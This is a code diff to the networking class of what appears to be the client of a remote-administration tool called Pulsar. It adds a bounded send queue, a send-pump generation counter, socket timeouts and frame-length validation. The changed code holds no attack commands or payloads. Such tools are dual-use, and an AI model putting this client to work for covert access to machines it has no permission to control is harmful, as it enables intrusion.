@@ -151,6 +151,7 @@ namespace Pulsar.Client.Networking
 
         readonly object _readMessageLock = new object();
         readonly object _sendMessageLock = new object();
+        readonly object _sendQueueLock = new object();
         readonly object _proxyClientsLock = new object();
 
         /// <summary>
@@ -161,7 +162,10 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// The queue which holds messages to send.
         /// </summary>
-        private readonly ConcurrentQueue<IMessage> _sendBuffers = new ConcurrentQueue<IMessage>();
+        private const int MaxQueuedMessages = 256;
+        private readonly ConcurrentQueue<PendingSend> _sendBuffers = new ConcurrentQueue<PendingSend>();
+        private int _queuedMessageCount;
+        private int _sendPumpGeneration;
 
         /// <summary>
         /// Determines if the client is currently sending messages.
@@ -234,6 +238,8 @@ namespace Pulsar.Client.Networking
 
                 handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                 handle.NoDelay = true;
+                handle.ReceiveTimeout = 30000;
+                handle.SendTimeout = 10000;
                 handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                 handle.Connect(ip, port);
 
@@ -278,8 +284,7 @@ namespace Pulsar.Client.Networking
                         if (_readBuffer.Length == HEADER_SIZE)
                         {
                             var length = BitConverter.ToInt32(_readBuffer, 0);
-                            if (length <= 0)
-                                throw new InvalidDataException("Invalid message length.");
+                            MessageInputLimits.ValidateFrameLength(length);
 
                             _readBuffer = new byte[length];
                             _readOffset = 0;
@@ -337,43 +342,95 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to be sent.</param>
         public void Send<T>(T message) where T : IMessage
         {
-            if (!Connected || message == null)
-                return;
-
-            _sendBuffers.Enqueue(message);
-            if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
+            lock (_sendQueueLock)
             {
-                ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
+                if (!Connected || message == null)
+                    return;
+
+                if (!Enqueue(new PendingSend(message)))
+                    return;
+                if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
+                {
+                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers, Volatile.Read(ref _sendPumpGeneration));
+                }
             }
         }
 
         private void ProcessSendBuffers(object state)
         {
+            int generation = state is int value ? value : -1;
             while (true)
             {
+                if (generation != Volatile.Read(ref _sendPumpGeneration))
+                    return;
+
                 if (!Connected)
                 {
                     SendCleanup(true);
                     return;
                 }
 
-                if (!_sendBuffers.TryDequeue(out var message))
+                if (!_sendBuffers.TryDequeue(out var pending))
                 {
-                    SendCleanup();
+                    lock (_sendQueueLock)
+                    {
+                        if (generation != Volatile.Read(ref _sendPumpGeneration))
+                            return;
+
+                        if (!_sendBuffers.IsEmpty && Connected)
+                            continue;
+
+                        Interlocked.Exchange(ref _sendingMessagesFlag, 0);
+                        return;
+                    }
+                }
+
+                Interlocked.Decrement(ref _queuedMessageCount);
+                if (generation != Volatile.Read(ref _sendPumpGeneration))
+                {
+                    pending.Complete();
                     return;
                 }
 
-                SafeSendMessage(message);
+                try { SafeSendMessage(pending.Message); }
+                finally { pending.Complete(); }
             }
         }
 
         private void SendCleanup(bool clear = false)
         {
-            Interlocked.Exchange(ref _sendingMessagesFlag, 0);
-            if (clear)
+            lock (_sendQueueLock)
             {
-                while (_sendBuffers.TryDequeue(out _)) ;
+                if (clear)
+                {
+                    while (_sendBuffers.TryDequeue(out var pending))
+                    {
+                        Interlocked.Decrement(ref _queuedMessageCount);
+                        pending.Complete();
+                    }
+                }
+                Interlocked.Exchange(ref _sendingMessagesFlag, 0);
             }
+        }
+
+        private bool Enqueue(PendingSend pending)
+        {
+            if (!Connected)
+            {
+                pending.Complete();
+                return false;
+            }
+
+            if (Interlocked.Increment(ref _queuedMessageCount) > MaxQueuedMessages)
+            {
+                Interlocked.Decrement(ref _queuedMessageCount);
+                pending.Complete();
+                Disconnect();
+                return false;
+            }
+
+            _sendBuffers.Enqueue(pending);
+            return true;
         }
         
         private IMessage PrepareMessageForSend(IMessage message)
@@ -437,7 +494,15 @@ namespace Pulsar.Client.Networking
             if (!Connected || message == null)
                 return;
 
-            SafeSendMessage(message);
+            var pending = new PendingSend(message, new ManualResetEventSlim(false));
+            lock (_sendQueueLock)
+            {
+                if (!Connected || !Enqueue(pending))
+                    return;
+                if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
+                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers, Volatile.Read(ref _sendPumpGeneration));
+            }
+            pending.Completed.Wait();
         }
 
         /// <summary>
@@ -522,8 +587,17 @@ namespace Pulsar.Client.Networking
                 }
             }
 
-            SendCleanup(true);
-            OnClientState(false);
+            lock (_sendQueueLock)
+            {
+                Interlocked.Increment(ref _sendPumpGeneration);
+                OnClientState(false);
+                while (_sendBuffers.TryDequeue(out var pending))
+                {
+                    Interlocked.Decrement(ref _queuedMessageCount);
+                    pending.Complete();
+                }
+                Interlocked.Exchange(ref _sendingMessagesFlag, 0);
+            }
         }
 
         public void ConnectReverseProxy(ReverseProxyConnect command)
@@ -566,6 +640,20 @@ namespace Pulsar.Client.Networking
         {
             Dispose(true);
             GC.SuppressFinalize(this);
+        }
+
+        private sealed class PendingSend
+        {
+            public readonly IMessage Message;
+            public readonly ManualResetEventSlim Completed;
+
+            public PendingSend(IMessage message, ManualResetEventSlim completed = null)
+            {
+                Message = message;
+                Completed = completed;
+            }
+
+            public void Complete() => Completed?.Set();
         }
     }
 }
